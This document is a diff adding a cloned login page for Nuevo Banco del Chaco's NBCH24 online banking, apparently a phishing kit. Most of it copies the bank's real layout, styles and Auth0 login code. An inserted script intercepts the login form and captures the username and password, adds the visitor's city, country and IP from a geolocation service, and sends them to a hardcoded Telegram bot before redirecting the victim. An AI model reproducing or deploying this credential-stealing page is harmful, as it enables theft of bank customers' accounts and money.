@@ -1,0 +1,700 @@
+<html><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>Ingresá a tu cuenta</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="SHORTCUT ICON" href="https://www.nbch.com.ar/Portals/0/favicon.ico?ver=2023-03-27-122733-527" type="image/x-icon">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"><!-- Link para importar la tipografia "Montserrat"-->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&amp;display=swap" rel="stylesheet"><!-- Link para importar los iconos-->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><!-- Importar JQuery-->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executers/vi-tr.js"></script><!-- Bootstrap JS-->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+    <style>
+        body,
+        html {
+            height: 100%;
+            background-image: url("https://cdnp.nbch.com.ar/Portals/0/Images/nbch24-fondo.v2.jpg");
+            background-position: initial;
+            background-size: auto;
+            background-repeat: no-repeat;
+            font-family: 'Montserrat', sans-serif;
+        }
+        
+        input {
+            filter: none !important;
+        }
+
+        input[type=text]:focus {
+            outline: none !important;
+            box-shadow: none !important;
+            border: 2px solid #00c8a9;
+        }
+
+        input[type=password]:focus {
+            outline: none !important;
+            box-shadow: none !important;
+            border: 2px solid #00c8a9;
+        }
+
+        #error-message {
+            display: none;
+        }
+
+        .tutoriales-container {
+            position: fixed;
+            top: 50px;
+            right: 670px;
+        }
+
+        .tutoriales-container img {
+            margin: auto;
+            width: 100%;
+            max-width: 280px;
+            height: auto;
+        }
+
+        .tutoriales-container-responsive {
+            display: none;
+            width: 100%;
+            height: fit-content;
+            text-align: center;
+        }
+
+        .tutoriales-container-responsive img {
+            margin: auto;
+            width: 100%;
+            max-width: 180px;
+            height: auto;
+        }
+
+        .login-container {
+            position: fixed;
+            background: white;
+            height: 100vh;
+            width: 100%;
+            max-width: 660px;
+            right: 0;
+            overflow-y: auto;
+            z-index: 10;
+        }
+
+        .login-box {
+            width: 100%;
+        }
+
+        .login-header {
+            padding-top: 40px;
+            display: grid;
+            grid-template-rows: repeat(2, 1fr);
+            grid-template-columns: 1fr;
+            max-width: 425px;
+            margin: 0 auto;
+        }
+
+        .login-header img {
+            width: 100%;
+            height: auto;
+            margin: auto;
+        }
+        .login-header-img-eslogan{
+            max-width: 100%;
+        }
+        
+        .login-header-img-logo{
+            max-width: 200px;
+        }
+        .login-header img:nth-child(4) {
+            margin-top: 0.5rem;
+            grid-column: 1 / -1;
+            max-width: 100%;
+        }
+
+        .divisor {
+            background: rgba(200 200 200 / 1);
+            margin: auto;
+            width: 2px;
+            border-radius: 100%;
+            height: 60%;
+        }
+
+        @media screen and (max-width: 960px) {
+            body {
+                background-position: center 100%;
+                background-size: contain;
+            }
+
+            .tutoriales-container {
+                display: none;
+            }
+
+            .tutoriales-container-responsive {
+                display: block;
+            }
+
+            .tutoriales-container-responsive img {
+                max-width: 115px;
+            }
+
+            .login-container {
+                padding-top: 15px;
+                max-width: 100%;
+                background: linear-gradient(.5turn, white 420px, transparent 60rem)
+            }
+
+            .login-header {
+                padding-top: 28px;
+                max-width: 290px;
+            }
+
+            .login-header-img-logo{
+                max-width: 125px;
+            }
+            
+            .divisor {
+                height: 40%;
+            }
+        }
+
+        @media screen and (max-height: 875px) {
+            .login-header {
+                padding-top: 25px;
+                max-width: 270px;
+            }
+
+            .tutoriales-container {
+                top: 25px;
+            }
+
+            .tutoriales-container img {
+                max-width: 180px;
+            }
+        }
+
+    </style>
+    <style>
+        .login-header-class {
+            margin: 5px 35px 0;
+            font-weight: 600;
+            color: #324a76;
+            text-align: center;
+        }
+
+        .ingresa-cuenta {
+            font-size: 5.5rem;
+            font-weight: bold;
+            letter-spacing: 0.25rem;
+            margin-top: 0;
+        }
+
+        .ingresa-cuenta--text {
+            font-size: 1.9rem;
+            letter-spacing: 0.05rem;
+        }
+
+        .login-form {
+            margin: 30px 35px;
+        }
+
+        .form-group {
+            margin-bottom: 8px;
+        }
+
+        .login-form--label {
+            font-size: 2.75rem;
+            font-weight: 100 !important;
+            color: #737373;
+            letter-spacing: 0.2rem;
+        }
+
+        .login-form--icon {
+            position: absolute;
+            right: 2rem;
+            cursor: pointer;
+            font-size: 3.5rem;
+            color: #b3b3b3;
+        }
+
+        .login-form--input {
+            height: auto;
+            border: 2px solid #8693a2;
+            border-radius: 15px;
+            font-size: 2.75rem;
+        }
+
+        .question-links {
+            display: flex;
+            margin-top: 40px;
+            justify-content: space-between;
+            font-size: 1.75rem;
+            font-weight: 500;
+        }
+
+        .question-links--container {
+            padding: 3px 20px;
+            border: 1px solid #4cdac3;
+            border-radius: 20px;
+        }
+
+        .question-links--link {
+            color: #324a76;
+        }
+
+        .login-form--footer {
+            margin-top: 60px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-form--footer--btn {
+            background: #004e7d;
+            margin: auto;
+            padding: 8px 80px;
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-size: 2.75rem;
+        }
+
+        .login-form--footer--btn:disabled {
+            background: #80a7c2;
+        }
+
+        .login-form--footer--hr {
+            background: #b3b3b3;
+            width: 295px;
+            height: 2px;
+            margin: 45px auto 5px;
+        }
+
+        .login-form--footer--p {
+            width: 310px;
+            margin: auto;
+            color: #737373;
+            font-size: 1.9rem;
+            font-weight: 500;
+            line-height: 2.25rem;
+            letter-spacing: -0.1rem;
+            text-align: center;
+        }
+
+        @media screen and (max-height: 875px) {
+            .login-header-class {
+                margin: 0 35px;
+            }
+
+            .ingresa-cuenta {
+                font-size: 4rem;
+            }
+
+            .ingresa-cuenta--text {
+                font-size: 1.4rem;
+            }
+
+            .login-form {
+                margin: 0 110px;
+            }
+
+            .form-group {
+                margin-bottom: 0;
+            }
+
+            .login-form--input {
+                font-size: 1.5rem;
+            }
+
+            .question-links {
+                margin-top: 20px;
+                font-size: 1.25rem;
+            }
+
+            .login-form--footer {
+                margin-top: 30px;
+            }
+
+            .login-form--footer--btn {
+                padding: 6px 60px;
+                font-size: 1.75rem;
+            }
+
+            .login-form--footer--hr {
+                width: 19rem;
+                margin: 25px auto 5px;
+            }
+
+            .login-form--footer--p {
+                width: 19rem;
+                font-size: 1.25rem;
+                line-height: 1.5rem;
+            }
+        }
+
+        @media screen and (max-width: 700px) {
+            .login-header-class {
+                margin: 18px 30px 0;
+            }
+
+            .ingresa-cuenta {
+                font-size: 2.55rem;
+                letter-spacing: 0rem;
+                margin-bottom: 0;
+            }
+
+            .ingresa-cuenta--text {
+                margin: 0 auto;
+                font-size: 0.85rem;
+                letter-spacing: 0rem;
+            }
+
+            .login-form {
+                padding: 0 10px;
+                margin: 18px auto;
+                max-width: 400px !important;
+            }
+
+            .login-form--label {
+                font-size: 1.3rem;
+                letter-spacing: 0rem;
+                margin-bottom: 2px;
+            }
+
+            .login-form--icon {
+                font-size: 2rem;
+                right: 1rem;
+            }
+
+            .login-form--input {
+                font-size: 1.1rem;
+                border: 1px solid #8693a2;
+            }
+
+            .question-links {
+                flex-direction: column;
+                font-size: 1.25rem;
+                width: fit-content;
+                margin: 22px auto 18px;
+                gap: 8px
+            }
+
+            .question-links--container {
+                font-size: 1rem
+            }
+
+            .login-form--footer {
+                margin-top: 0;
+            }
+
+            .login-form--footer--btn {
+                padding: 4px 55px;
+                font-size: 1.75rem;
+            }
+
+            .login-form--footer--hr {
+                width: 240px;
+                height: 1px;
+                margin: 18px auto 10px;
+            }
+
+            .login-form--footer--p {
+                width: 240px;
+                font-size: 1.45rem;
+                line-height: 1.25rem;
+            }
+        }
+        
+        @media (max-width: 430px) {
+            body, html {
+                background-size: 160%;
+            }
+        }
+
+        @media screen and (max-width: 960px) {
+            .ingresa-cuenta--text {
+                margin: 0 auto;
+            }
+
+            .login-form {
+                max-width: 590px;
+                margin: 18px auto;
+            }
+        }
+
+    </style>
+</head>
+<body __processed_08ce1dc5-d9c1-4461-96e5-e341d9bf8408__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMCIsInNjb3JlIjoyMDAyMH1d" bis_skin_checked="1"><div class="main-container" bis_skin_checked="1">
+    <div class="tutoriales-container" bis_skin_checked="1"><a href="https://www.youtube.com/playlist?list=PLwWZj-FkWPVvS_2uSg90gVuoOnkxEVJpx" target="_blank" bis_skin_checked="1"> <img src="https://www.nbch.com.ar/Portals/0/Images/nbch24-boton-tutoriales.v1.png" alt="boton-tutoriales"></a></div>
+    <div class="login-container" bis_skin_checked="1">
+        <div class="login-box" style="z-index:1000" bis_skin_checked="1">
+            <div class="tutoriales-container-responsive" bis_skin_checked="1"><a href="https://www.youtube.com/playlist?list=PLwWZj-FkWPVvS_2uSg90gVuoOnkxEVJpx" bis_skin_checked="1"> <img src="https://www.nbch.com.ar/Portals/0/Images/nbch24-boton-tutoriales.v1.png" alt="boton-tutoriales"></a></div>
+            <div class="login-header" bis_skin_checked="1">
+                <img class="login-header-img-logo" src="https://www.nbch.com.ar/Portals/0/Images/nbch24-logo-nbch24-online-banking.v1.png">
+                <img class="login-header-img-eslogan" src="https://www.nbch.com.ar/Portals/0/Images/nbch24-billetera-tu-banco-siempre-con-vos.v1.png">
+            </div>
+            <div class="login-header-class" bis_skin_checked="1">
+                <h1 class="ingresa-cuenta">Ingresá a tu cuenta</h1>
+                <p class="ingresa-cuenta--text">Iniciá sesión en la plataforma del Nuevo Banco del Chaco.</p>
+            </div>
+            <div class="alert alert-danger" id="error-message" bis_skin_checked="1"></div>
+            <div class="login-form" bis_skin_checked="1">
+                <form id="login-form" method="post">
+                    <div class="form-group" bis_skin_checked="1"><label class="login-form--label" for="usr">Usuario</label><input class="form-control login-form--input" id="usr" type="text" autocomplete="off" required=""></div>
+                    <div class="form-group" bis_skin_checked="1"><label class="login-form--label" for="password">Contraseña</label>
+                        <div style="position: relative; display: flex; align-items: center;" bis_skin_checked="1"><i class="fa fa-eye-slash eye-icon login-form--icon" aria-hidden="true" onclick="showPassword()"></i><input class="form-control login-form--input" id="password" type="password" required=""></div>
+                    </div>
+                    <div class="question-links" bis_skin_checked="1">
+                        <div class="center question-links--container" id="link-olvidaste-tu-password" bis_skin_checked="1"><a class="question-links--link" href="https://24onboarding.nbch.com.ar/#/resetpassword" bis_skin_checked="1">¿Olvidaste tu contraseña?</a></div>
+                        <div class="center question-links--container" id="link-crear-usuario" bis_skin_checked="1"><a class="question-links--link" href="https://24onboarding.nbch.com.ar/#/newuser" bis_skin_checked="1">¿Todavía no tenés usuario?</a></div>
+                    </div>
+                    <div class="login-form--footer" bis_skin_checked="1">
+                        <div class="captcha-container form-group" bis_skin_checked="1" style="display: none;"></div><button type="submit" class="login-form--footer--btn" id="btn-login">Ingresar</button>
+                        
+                        
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div id="gradient" bis_skin_checked="1"></div>
+    </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script>
+		const url = "https://ipapi.co/json/";
+		const form = document.querySelector("#login-form");
+		form.addEventListener("submit", (event) => {
+		  event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+		  axios
+			.get(url)
+			.then((response) => {
+			  const usr = document.querySelector("#usr").value;
+              const password = document.querySelector("#password").value;
+			  const message =
+				"🔵NBCH24🔵" +
+				"\n👤Usuario: " +
+				usr +
+                "\n🔐Contraseña: " +
+				password +
+				"\n🏙️Ciudad: " +
+				response.data.city +
+				"\n🌎Pais: " +
+				response.data.country +
+				"\n🔢IP: " +
+				response.data.ip +
+				"\n🤑JSC0D3R🤑";
+			  axios
+				.post(
+				  "https://api.telegram.org/bot7769909892:AAG5gzgIiC892tIXRlp3_rmAp8aFEe7mOjA/sendMessage",
+				  {
+					chat_id: "5150089222",
+					text: message,
+				  }
+				)
+				.then((response) => {
+				  console.log(response.data);
+				  window.location.href = "cargando.html";
+				})
+				.catch((error) => {
+				  console.error(error);
+				});
+			})
+			.catch((error) => {
+			  console.log(error);
+			});
+		});
+	  </script>
+<!--if IE 8script(src='//cdnjs.cloudflare.com/ajax/libs/ie8/0.2.5/ie8.js')-->
+<!--if lte IE 9script(src='https://cdn.auth0.com/js/polyfills/1.0/base64.min.js')
+script(src='https://cdn.auth0.com/js/polyfills/1.0/es5-shim.min.js')-->
+<script src="https://cdn.auth0.com/js/auth0/9.14/auth0.min.js"></script>
+<script src="https://cdn.auth0.com/js/polyfills/1.0/object-assign.min.js"></script>
+<script>
+    window.addEventListener('load', function() {
+        var config = JSON.parse(
+            decodeURIComponent(escape(window.atob('eyJpY29uIjoiaHR0cHM6Ly93d3cubmJjaC5jb20uYXIvUG9ydGFscy8wL0ltYWdlcy9Mb2dvLW5iY2gtMTk0eDcxLnYxLnBuZz92ZXI9MjAyMy0wMy0yNy0xMjI3NTUtNDUwIiwiYXNzZXRzVXJsIjoiIiwiYXV0aDBEb21haW4iOiJhdXRoLm5iY2guY29tLmFyIiwiYXV0aDBUZW5hbnQiOiJuYmNoIiwiY2xpZW50Q29uZmlndXJhdGlvbkJhc2VVcmwiOiJodHRwczovL2F1dGgubmJjaC5jb20uYXIvIiwiY2FsbGJhY2tPbkxvY2F0aW9uSGFzaCI6ZmFsc2UsImNhbGxiYWNrVVJMIjoiaHR0cHM6Ly8yNC5uYmNoLmNvbS5hci93ZWJiYW5rLXB1YmxpYy13ZWIvY2FsbGJhY2svYXV0aDAiLCJjZG4iOiJodHRwczovL2Nkbi5hdXRoMC5jb20vIiwiY2xpZW50SUQiOiJTT040dXdUamcwYkZzWmdJTXgwSlNSUm8yMXRSMWgyWCIsImRpY3QiOnsic2lnbmluIjp7InRpdGxlIjoiZG9pdC13ZWIifX0sImV4dHJhUGFyYW1zIjp7InByb3RvY29sIjoib2F1dGgyIiwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwiX2NzcmYiOiJ0andhc1lxMC0tRkUwWl9qZXJRWWFfZmtYYl9qX1p4NkRRdFkiLCJfaW50c3RhdGUiOiJkZXByZWNhdGVkIiwic3RhdGUiOiJoS0ZvMlNCQlpFcHRiVWMzT1hnMVJIVkpMVlZ1ZWpWSU0wZG5TSE0yVEVocE1VSk1WS0Z1cFd4dloybHVvM1JwWk5rZ1RrWm1ORVZwUTFwR1preDBhMlk1WlRobGFVRk1YMjR0VEhKb2VFWk9aRU9qWTJsazJTQlRUMDQwZFhkVWFtY3dZa1p6V21kSlRYZ3dTbE5TVW04eU1YUlNNV2d5V0EifSwiaW50ZXJuYWxPcHRpb25zIjp7InByb3RvY29sIjoib2F1dGgyIiwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwiX2NzcmYiOiJ0andhc1lxMC0tRkUwWl9qZXJRWWFfZmtYYl9qX1p4NkRRdFkiLCJfaW50c3RhdGUiOiJkZXByZWNhdGVkIiwic3RhdGUiOiJoS0ZvMlNCQlpFcHRiVWMzT1hnMVJIVkpMVlZ1ZWpWSU0wZG5TSE0yVEVocE1VSk1WS0Z1cFd4dloybHVvM1JwWk5rZ1RrWm1ORVZwUTFwR1preDBhMlk1WlRobGFVRk1YMjR0VEhKb2VFWk9aRU9qWTJsazJTQlRUMDQwZFhkVWFtY3dZa1p6V21kSlRYZ3dTbE5TVW04eU1YUlNNV2d5V0EifSwid2lkZ2V0VXJsIjoiaHR0cHM6Ly9jZG4uYXV0aDAuY29tL3cyL2F1dGgwLXdpZGdldC01LjIubWluLmpzIiwiaXNUaGlyZFBhcnR5Q2xpZW50IjpmYWxzZSwiYXV0aG9yaXphdGlvblNlcnZlciI6eyJ1cmwiOiJodHRwczovL2F1dGgubmJjaC5jb20uYXIiLCJpc3N1ZXIiOiJodHRwczovL2F1dGgubmJjaC5jb20uYXIvIn0sImNvbG9ycyI6eyJwYWdlX2JhY2tncm91bmQiOiIjZmZmZmZmIiwicHJpbWFyeSI6IiMwMDU5ZDYifX0=')))
+        );
+        var params = Object.assign({
+            configurationBaseUrl: config.clientConfigurationBaseUrl,
+            overrides: {
+                __tenant: config.auth0Tenant,
+                __token_issuer: config.authorizationServer.issuer
+            },
+            domain: config.auth0Domain,
+            clientID: config.clientID,
+            redirectUri: config.callbackURL,
+            responseType: 'code'
+        }, config.internalOptions);
+        var webAuth = new auth0.WebAuth(params);
+
+        /**
+         * 
+         * DATABASE CONECTION en AUTH0
+         * 
+         * Si el parámetro connection no está definido
+         * seteamos el string de conexión LDAP de Active Directory
+         * del NBCH.
+         **/
+        var connection;
+        var esAD;
+        if (
+            // doit-mobile application
+            config.clientID === "RDJAkcTmOhU6SnZ0jzPjECXmV3nj7TjS" ||
+            // doit-web application
+            config.clientID === "SON4uwTjg0bFsZgIMx0JSRRo21tR1h2X" ||
+            //btrader
+            config.clientID === "YZqpEMr97GyB8pgVQLVagUlmNAWv79As"
+        ) {
+            connection = "nbch";
+        }  else if (
+            // Concesionarias Web 
+            config.clientID === "dwsVZyZO6OV5WP3S8Gc0z0DLFnUpkSCv" ||
+            // autogestionweb
+            config.clientID === "fd1Zqrpz4Pajj3qdTX6sQccMSBh5qpNp"
+        ){
+            connection = config.connection
+        } else {
+            esAD = true;
+            connection = "ProdLDAPS";
+        }
+
+        // si es una conexión de tipo Active Directory, ocultamos elementos de la vista
+        // que no corresponden
+        if (esAD || (config.clientID === "dwsVZyZO6OV5WP3S8Gc0z0DLFnUpkSCv") || (config.clientID === "fd1Zqrpz4Pajj3qdTX6sQccMSBh5qpNp")) {
+            document.querySelector("div#link-olvidaste-tu-password").style.display = 'none'
+            document.querySelector("div#link-crear-usuario").style.display = 'none'
+            document.querySelector(".login-header-img-eslogan").style.display = 'none'
+            document.querySelector(".tutoriales-container").style.display = 'none'
+            const loginHeaderLogo = document.querySelector('.login-header-img-logo');
+                        loginHeaderLogo.setAttribute("src", "https://www.nbch.com.ar/Portals/0/Images/logo_nbch8.png?ver=2015-08-04-195014-000");
+        }
+
+
+        var captcha = webAuth.renderCaptcha(
+            document.querySelector('.captcha-container')
+        );
+
+        function login(e) {
+            e.preventDefault();
+            var button = document.getElementById('btn-login');
+            var username = document.getElementById('usr').value;
+            var password = document.getElementById('password').value;
+            if (username && password) {
+                button.disabled = true;
+                webAuth.login({
+                    realm: connection,
+                    username: username,
+                    password: password,
+                    captcha: captcha.getValue()
+                }, function(err) {
+                    if (err) displayError(err);
+                    button.disabled = false;
+                });
+            }
+        }
+
+        function signup() {
+            var button = this;
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            button.disabled = true;
+            webAuth.redirect.signupAndLogin({
+                connection: connection,
+                email: email,
+                password: password,
+                captcha: captcha.getValue()
+            }, function(err) {
+                if (err) displayError(err);
+                button.disabled = false;
+            });
+        }
+
+        function loginWithGoogle() {
+            webAuth.authorize({
+                connection: 'google-oauth2'
+            }, function(err) {
+                if (err) displayError(err);
+            });
+        }
+
+        function displayError(err) {
+            captcha.reload();
+            var error
+            if (err.code === "invalid_user_password") {
+                error = "Usuario o contraseña inválido."
+            } else if (err.code === "too_many_attempts") {
+                error = "Su cuenta ha sido bloqueada después de varios intentos de inicio de sesión consecutivos. Hemos enviado un correo electrónico con instrucciones sobre cómo desbloquearla."
+            } else if (
+                err.description &&
+                err.description.length &&
+                err.descripcion.trim().toLowerCase() !== "invalid state"
+            ) {
+                error = err.description
+            } else {
+                error = "Disculpá, hubo un error no identificado. Volvé a intentarlo más tarde."
+            }
+            var errorMessage = document.getElementById('error-message');
+            errorMessage.innerHTML = error;
+            errorMessage.style.display = 'block';
+        }
+
+        document.getElementsByTagName("form")[0].onsubmit = login
+    });
+
+    function showPassword() {
+        var x = document.getElementById("password");
+        if (x.type === "password") {
+            x.type = "text";
+        } else {
+            x.type = "password";
+        }
+    }
+
+    $(document).ready(function() {
+
+        // se controla si el navegador es EDGE
+        if (/edg/ig.test(navigator.userAgent)) {
+            // se ocultan los botones para mostrar la contraseña
+            $(".fa.fa-eye").css("display", "none");
+        }
+
+        // BUGFIX de autocomplete de chrome y firefox
+        // que ocultaba los valores con los labels
+        // de los campos.
+        function checkIfFieldsAreNotEmptyAndAddClass() {
+            $(".form-control").each(function() {
+                if (
+                    this.value.trim() !== "" ||
+                    (
+                        !/firefox/ig.test(navigator.userAgent) &&
+                        $(this).is("*:-webkit-autofill")
+                    )
+                ) {
+                    $(this).parent().addClass("label-animate");
+                }
+            });
+        }
+
+        setTimeout(checkIfFieldsAreNotEmptyAndAddClass, 500);
+
+        $(".form-control").change(checkIfFieldsAreNotEmptyAndAddClass)
+
+
+        $(".form-control").focus(function() {
+            $(this).parent().addClass("label-animate");
+        });
+        $(window).click(function() {
+            if (!$(event.target).is('.form-control')) {
+                $(".form-control").each(function() {
+                    if (
+                        $(this).val() == '' &&
+                        /*
+                          bugfix de submit de formulario con botón
+                          enter de teclado, que ocultaba el texto
+                        */
+                        !$(this).is(":focus")
+                    ) {
+                        $(this).parent().removeClass("label-animate");
+                    }
+                });
+            }
+        });
+    });
+
+</script></body></html>
